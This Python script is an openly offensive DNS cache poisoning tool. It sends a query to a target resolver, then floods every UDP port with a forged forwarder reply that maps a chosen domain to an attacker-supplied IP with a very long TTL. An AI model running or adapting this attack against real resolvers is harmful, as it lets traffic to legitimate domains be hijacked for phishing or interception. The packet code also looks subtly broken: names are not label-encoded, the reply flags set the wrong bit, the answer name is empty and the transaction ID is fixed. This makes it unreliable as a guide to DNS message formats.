#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A DNS-server cache poisoning tool."""
from argparse import ArgumentParser
from logging import error
from re import compile as re_compile, search
from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack
from sys import exit as sys_exit


__version__ = '1.0'
__author__ = 'Semyon Makhaev'
__email__ = 'semenmakhaev@yandex.ru'


DNS_PORT = 53


def main():
    """
    Request to server sending and trying
    to send a fake data to this server.
    """
    server, name, address = argument_parse()

    transaction_id = 1

    request = get_request(name, transaction_id)
    reply = get_reply(name, address, transaction_id)

    sock = socket(AF_INET, SOCK_DGRAM)

    with sock:

        # Request sending.
        sock.sendto(request, (server, DNS_PORT))

        # DNS-server starts to ask its forward server.

        # Trying to imitate a forwarder.
        for port in range(65536):
            try:
                sock.sendto(reply, (server, port))
            except OSError:
                continue


def argument_parse():
    """Arguments parsing."""
    parser = ArgumentParser(prog='poison.py',
                            description='The program for DNS-server cache poisoning.',
                            epilog='(c) Semyon Makhaev, 2016. All rights reserved.')
    parser.add_argument('server', type=str, help='IP-address of the target DNS-server.')
    parser.add_argument('name', type=str, help='The requested domain name.')
    parser.add_argument('address', type=str, help='The address for this domain name.')
    args = parser.parse_args()

    address_pattern = re_compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')

    is_server_correct = search(address_pattern, args.server) is not None
    is_address_correct = search(address_pattern, args.address) is not None

    if not is_server_correct or not is_address_correct:
        error('Incorrect address.')
        sys_exit(1)

    return args.server, args.name, args.address


def get_request(name, transaction_id):
    """DNS-request packing."""
    questions = 1
    request_type = 1
    request_class = 1
    name_len = len(name)

    # Message format is described in RFC 1035
    # https://tools.ietf.org/html/rfc1035#page-25

    return pack(f'!HHHHHH{name_len}sBHH', transaction_id, 0,
                questions, 0, 0, 0, name.encode(), 0,
                request_type, request_class)


def get_reply(name, address, transaction_id):
    """Forwarder DNS-reply packing."""
    questions = 1
    answer_rrs = 1
    reply_type = 1
    reply_class = 1
    data_len = 4
    name_len = len(name)
    ttl = 4228250625  # 255 ** 4 = 4228250625. It's a random value

    addr = [int(part) for part in address.split('.')]

    # Message format is described in RFC 1035
    # https://tools.ietf.org/html/rfc1035#page-25

    return pack(f'!HHHHL{name_len}sBHHHHHLHBBBB', transaction_id, 1 << 3,
                questions, answer_rrs, 0, name.encode(), 0, reply_type,
                reply_class, 0, reply_type, reply_class, ttl, data_len, *addr)


if __name__ == '__main__':
    main()
